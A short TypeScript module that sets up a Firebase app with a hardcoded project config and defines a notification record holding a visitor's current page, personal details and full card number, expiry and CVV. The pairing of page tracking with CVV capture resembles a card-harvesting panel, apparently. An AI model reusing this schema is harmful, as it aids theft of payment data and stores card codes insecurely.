import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDBMqcU7j_xGlTFJ0chMjaSIjLqdD4UJac",
  authDomain: "zainmfs-f5e34.firebaseapp.com",
  databaseURL: "https://zainmfs-f5e34-default-rtdb.firebaseio.com",
  projectId: "zainmfs-f5e34",
  storageBucket: "zainmfs-f5e34.firebasestorage.app",
  messagingSenderId: "995287662716",
  appId: "1:995287662716:web:0dbefc4280f5260d3dc9f9",
  measurementId: "G-GB2N8XSSF8"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
